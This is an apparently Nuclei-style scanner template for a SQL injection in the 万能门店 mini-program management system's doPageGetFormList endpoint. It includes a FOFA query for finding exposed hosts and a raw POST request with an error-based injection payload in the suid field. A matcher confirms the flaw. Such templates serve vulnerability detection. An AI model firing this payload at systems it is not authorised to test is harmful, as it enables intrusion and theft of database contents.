id: wannengmendian-doPageGetFormList-sql

info:
  name: 万能门店小程序管理系统 doPageGetFormList SQL注入
  author: HuanXiong
  severity: high
  description: |-
    fofa: body="/comhome/cases/index.html"
    万能门店小程序管理系统 doPageGetFormList 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 此漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - 
  tags: sql injection

http:
  - raw:
      - |
        POST /api/wxapps/doPageGetFormList HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Content-Type: application/x-www-form-urlencoded

        suid=' AND GTID_SUBSET(CONCAT((SELECT (md5(123456)))),1)-- bdmV

    matchers:
      - type: dsl
        name: SQL注入
        dsl:
          - "status_code==500 && contains_all(body,'e10adc3949ba59abbe56e057f20f883e')"